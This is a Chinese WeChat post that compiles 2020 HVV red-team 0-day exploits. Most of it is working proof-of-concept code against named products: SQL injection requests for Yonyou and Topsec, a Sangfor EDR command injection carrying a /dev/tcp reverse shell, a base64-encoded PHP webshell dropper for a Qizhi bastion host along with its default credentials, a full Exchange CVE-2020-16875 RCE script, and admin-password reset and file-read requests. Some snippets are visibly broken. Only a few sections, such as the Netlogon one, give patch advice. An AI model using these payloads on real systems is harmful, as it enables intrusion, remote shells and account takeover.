\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/Nct2VjbRdGgEPtZDn82yTw)

▼

  

更多精彩推荐，请关注我们

▼

HVV2020-0day 总结

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x00 目录

    0x01 用友 GRP-U8 SQL 注入

    0x02 天融信 TopAPP-LB SQL 注入

    0x03 深信服 EDR RCE 漏洞

    0x04 WPS 命令执行漏洞

    0x05 绿盟 UTS 绕过登录

    0x06 齐治堡垒机 RCE

    0x07 泛微云桥任意文件读取

    0x08 Exchange Server 远程代码执行漏洞

    0x09 Apache DolphinScheduler 权限覆盖漏洞 \[CVE-2020-13922\]

    0x10 Netlogon 特权提升漏洞（CVE-2020-1472）

    0x11 activemq 远程代码执行 0day

    0x12 天融信数据防泄漏系统越权修改管理员密码

    0x13 Wordpress File-manager 任意文件上传

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x01 用友 GRP-U8 SQL 注入

    直接上 POC  

```
POST /Proxy HTTP/1.1
Accept: Accept: \*/\*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: host
Content-Length: 357
Connection: Keep-Alive
Cache-Control: no-cache
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2313"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS\_DataRequest></NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><NAME>Data</NAME><DATA format="text">exec xp\_cmdshell 'net user'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>

```

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x02 天融信 TopAPP-LB SQL 注入

    直接上 POC  

```
POST /acc/clsf/report/datasource.php HTTP/1.1
Host: host
Connection: close
Accept: text/javascript, text/html, application/xml, text/xml, \*/\*
X-Prototype-Version: 1.6.0.3
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57
Content-Type: application/x-www-form-urlencoded
Content-Length: 201
t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&gid=0&lmt=10&o=r\_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。

```

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x03 深信服 EDR RCE 漏洞

    又是深信服的 EDR，太惨了  

```
POST /api/edr/sangforinter/v2/cssp/slog\_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
Host: xx.x.x.x
Connection: close
Accept-Encoding: gzip, deflate
Accept: \*/\*
User-Agent: python-requests/2.22.0
Content-Length: 77
{"params": "w=123\\"'1234123'\\"|bash -i >& /dev/tcp/ip/port 0>&1"}

```

    这里附上脚本 POC，若需完整 POC 请关注微信公众号，并**回复 “EDR RCE”**  

```
def poc(u,\*\*attack):
    print("\[\*\] Checking %s"%(u))
    uri = "/api/edr/sangforinter/v2/cssp/slog\_client?token=eyJtZDUiOnRydWV9"
    url = u+uri
    if not attack:
        data={"params":"w=123\\"'1234123'\\"|echo aaabbbccc00aa"}
    else:
        if attack\['flag'\]:
            data={"params":"w=123\\"'1234123'\\"|{}".format(attack\['cmd'\])}
    try:
        res = requests.post(url,data=json.dumps(data),verify=False,timeout=timeout)
        data = json.loads(res.content)
        if (data\["code"\] == 0) or (data\["code"\] == 1116):
            print("\[\*\] %s is vulnerabile !"%(u))
            if attack and (data\["code"\] == 0):
                for d in data\["data"\]:
                    print(d)
            else:
                print("\[-\] May command error!")
        else:
            print("\[\*\] %s may not vulnerabile ! ,code is:%s"%(u,str(data\["code"\])))
    except Exception as e:
        print("\[-\] Error %s , %s"%(u,e))

```

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x04 WPS 命令执行漏洞

    详情请查看：http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x05 绿盟 UTS 绕过登录

    随便输密码 -> 修改返回包为 True-> 放行 -> 等待第二次拦截包 -> 内含管理员 MD5-> 替换 MD5 登录  
    直接请求接口：/webapi/v1/system/accountmanage/account

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x06 齐治堡垒机 RCE

    利用条件：无法登录

    利用过程:

*   第一，http://10.20.10.11/listener/cluster\_manage.php 返回 “OK”。
    
*   第二，执行以下链接即可 getshell，执行成功后，生成 PHP 一句话马 / var/www/shterm/resources/qrcode/lbj77.php 密码 10086。这里假设 10.20.10.10 为堡垒机的 IP 地址。
    

```
https://10.20.10.10/ha\_request.php?action=install&ipaddr=10.20.10.11&node\_id=1${IFS}|\`echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}-d|bash\`|${IFS}|echo${IFS}

```

 _这里提供齐治堡垒机的默认账号密码 **shterm/shterm**_

    修复意见：

        $node\_id 的看起来应该是一个整数，所以只需在 ha\_request.php 文件开头，添加以下一行代码，对该变量进行过滤即可。

```
$node\_id = @intval($req\_node\_id);

```

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x07 泛微云桥任意文件读取

    这里直接给 POC，若需完整 POC 请关注微信公众号，并**回复 “泛微云桥”**  

```
def poc(u):
    print("\[\*\] Checking %s"%(u))
    uri = "/wxjsapi/saveYZJFile?file
    url = u + uri
    try:
        res = requests.get(url,verify=False)
    except:
        print("\[-\] %s not vulnerabile!"%(u))
        return
    try:
        data = json.loads(res.content)
        print("\[\*\] %s is vulnerabile!" %(u))
        res = requests.get(u+"/file/fileNoLogin/%s"%(data\['id'\]))
        print(res.text)
    except:
        print("\[-\] %s not vulnerabile!"%(u))

```

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x08 Exchange Server 远程代码执行漏洞

    CVE-2020-16875: Exchange Server 远程代码执行漏洞（202009 月度漏洞）

    这里有大佬写好的 poc，但是因为需要梯子，这里就提供给大家  

```
#!/usr/bin/env python3
"""
Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability
Patch: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875
# Example:
researcher@incite:~$ ./poc.py
(+) usage: ./poc.py <target> <user:pass> <cmd>
(+) eg: ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint
researcher@incite:~$ ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint
(+) logged in as harrym@exchangedemo.com
(+) found the \_\_viewstate: /wEPDwUILTg5MDAzMDFkZFAeyPS7/eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5
(+) executed mspaint as SYSTEM!
"""
import re
import sys
import random
import string
import urllib3
import requests
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
def random\_string(str\_len=8):
    letters = string.ascii\_lowercase
    return ''.join(random.choice(letters) for i in range(str\_len))
def get\_xml(c):
    return """<?xml version="1.0" encoding="UTF-8"?>
<dlpPolicyTemplates>
  <dlpPolicyTemplate mode="Audit" state="Enabled" version="15.0.2.0">
    <contentVersion>4</contentVersion>
    <publisherName>si</publisherName>
    <name>
      <localizedString lang="en"></localizedString>
    </name>
    <description>
      <localizedString lang="en"></localizedString>
    </description>
    <keywords></keywords>
    <ruleParameters></ruleParameters>
    <policyCommands>
      <commandBlock>
        <!\[CDATA\[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.File;$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() \]\]>
      </commandBlock>
    </policyCommands>
    <policyCommandsResources></policyCommandsResources>
  </dlpPolicyTemplate>
</dlpPolicyTemplates>""" % c
def trigger\_rce(t, s, vs, cmd):
    f = {
        '\_\_VIEWSTATE': (None, vs),
        'ctl00$ResultPanePlaceHolder$senderBtn': (None, "ResultPanePlaceHolder\_ButtonsPanel\_btnNext"),
        'ctl00$ResultPanePlaceHolder$contentContainer$name': (None, random\_string()),
        'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl': ("dlprce.xml", get\_xml(cmd)),
    }
    r = s.post("https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx" % t, files=f, verify=False)
    assert r.status\_code == 200, "(-) failed to trigger rce!"
def leak\_viewstate(t, s):
    r = s.get("https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx" % t, verify=False)
    match = re.search("<input type=\\"hidden\\" name=\\"\_\_VIEWSTATE\\" id=\\"\_\_VIEWSTATE\\" value=\\"(.\*)\\" />", r.text)
    assert match != None, "(-) couldn't leak the \_\_viewstate!"
    return match.group(1)
def log\_in(t, usr, pwd):
    s = requests.Session()
    d = {
        "destination" : "https://%s/owa" % t,
        "flags" : "",
        "username" : usr,
        "password" : pwd
    }
    s.post("https://%s/owa/auth.owa" % t, data=d, verify=False)
    assert s.cookies.get(name='X-OWA-CANARY') != None, "(-) couldn't leak the csrf canary!"
    return s
def main(t, usr, pwd, cmd):
    s = log\_in(t, usr, pwd)
    print("(+) logged in as %s" % usr)
    vs = leak\_viewstate(t, s)
    print("(+) found the \_\_viewstate: %s" % vs)
    trigger\_rce(t, s, vs, cmd)
    print("(+) executed %s as SYSTEM!" % cmd)
if \_\_name\_\_ == '\_\_main\_\_':
    if len(sys.argv) != 4:
        print("(+) usage: %s <target> <user:pass> <cmd>" % sys.argv\[0\])
        print("(+) eg: %s 192.168.75.142 harrym@exchangedemo.com:user123### mspaint" % sys.argv\[0\])
        sys.exit(-1)
    trgt = sys.argv\[1\]
    assert ":" in sys.argv\[2\], "(-) you need a user and password!"
    usr = sys.argv\[2\].split(":")\[0\]
    pwd = sys.argv\[2\].split(":")\[1\]
    cmd = sys.argv\[3\]
    main(trgt, usr, pwd, cmd)

```

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x09 Apache DolphinScheduler 权限覆盖漏洞 \[CVE-2020-13922\]

    它是一个分布式去中心化，易扩展的可视化 DAG(有向无环图) 工作流任务调度系统。利用漏洞: 需要登录权限, \[09/12 态势感知\] 提供一组默认密码。

该漏洞存在于数据源中心未限制添加的 jdbc 连接参数, 从而实现 JDBC 客户端反序列化。

1.  登录到面板 -> 数据源中心。
    
2.  jdbc 连接参数就是主角, 这里没有限制任意类型的连接串参数。
    
3.  将以下数据添加到 jdbc 连接参数中, 就可以直接触发。
    

```
POST /dolphinscheduler/datasources/connect HTTP/1.1
type=MYSQL&name=test¬e=&host=127.0.0.1&port=3306&database=test&
principal=&userName=root&password=root&connectType=&
other={"detectCustomCollations":true,"autoDeserialize":true}

```

    关于 JDBC 反序列化漏洞的分析可以参考安全客上大佬分享的一篇文章

    https://www.anquanke.com/post/id/203086

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x10 Netlogon 特权提升漏洞（CVE-2020-1472）

这个漏洞简直就是核武器，CVSS 评分直接为 10 分，该漏洞未经身份验证的攻击者通过 Netlogon 远程协议（MS-NRPC）建立与域控制器连接的安全通道时，可利用此漏洞获取域管理员访问权限。此漏洞在微软 8 月补丁更新时披露了，建议受影响的用户尽快进行防护以及打补丁，打补丁时一定要注意备份，避免系统过老，导致出问题。  

受影响的版本如下：

```
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016  (Server Core installation)
Windows Server 2019
Windows Server 2019  (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)

```

漏洞检测：

披露此漏洞的 Secura 已在 GitHub 上传了验证脚本，相关用户可使用此工具进行检测：https://github.com/SecuraBV/CVE-2020-1472/

漏洞防护：

1.  官方升级
    
    目前微软官方已针对受支持的产品版本发布了修复此漏洞的安全补丁，强烈建议受影响用户尽快安装补丁进行防护，官方下载链接：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472  
    
2.  其他防护措施
    
    在安装更新补丁后，还可通过部署域控制器 (DC) 强制模式以免受到该漏洞影响：
    

请参考官方文档进行配置《如何管理与 CVE-2020-1472 相关的 Netlogon 安全通道连接的更改》：https://support.microsoft.com/zh-cn/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc

```
POST /Proxy HTTP/1.1
Accept: Accept: \*/\*

```

其他工具：https://github.com/dirkjanm/CVE-2020-1472

这里有小伙伴复现成功的截图  

  

  

  
‍

![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqIQiaepOP13rOKcN7vNA8MY6tPcN6pBOkKR2B4NENd3ibrRIo5N2UXYGOux4Rq570zXxuaQMowxeNFQ/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x11 activemq 远程代码执行 0day

请参考：http://activemq.apache.org/security-advisories.data/CVE-2020-13920-announcement.txt  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x12 天融信数据防泄漏系统越权修改管理员密码

需登录权限, 由于修改密码处未校验原密码, 且 /?module=auth\_user&action=mod\_edit\_pwd  

接口未授权访问, 造成直接修改任意用户密码。: 默认 superman 账户 uid 为 1。

```
POST /?module=auth\_user&action=mod\_edit\_pwd
Cookie: username=superman;
uid=1&pd=Newpasswd&mod\_pwd=1&dlp\_perm=1

```

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x13 Wordpress File-manager 任意文件上传

详情请参考安全客: https://www.anquanke.com/post/id/21699  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)

0x13 总结

其实这里公布的只是本次 HVV 出现的部分漏洞，还有未公开 POC 的漏洞还有很多未知的 0day，总的来说，安全无止尽，未知攻焉知防。也不知道有没有细心的小伙伴发现，前两年的 HVV 都是对网站攻击或者是社工，今年更多的是对安全设备的攻击，至于为啥，大家可以仔细思考。

  

secteam 公众号

  

微信搜索 : secteam

长按识别二维码关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqKticW5ZWC15ibIkiassjrnzm49qKOiccGP2afCSib51VfB83AZYBQ0U09vmYVILSh2dlRXUiaojRYxDX0A/640?wx_fmt=jpeg)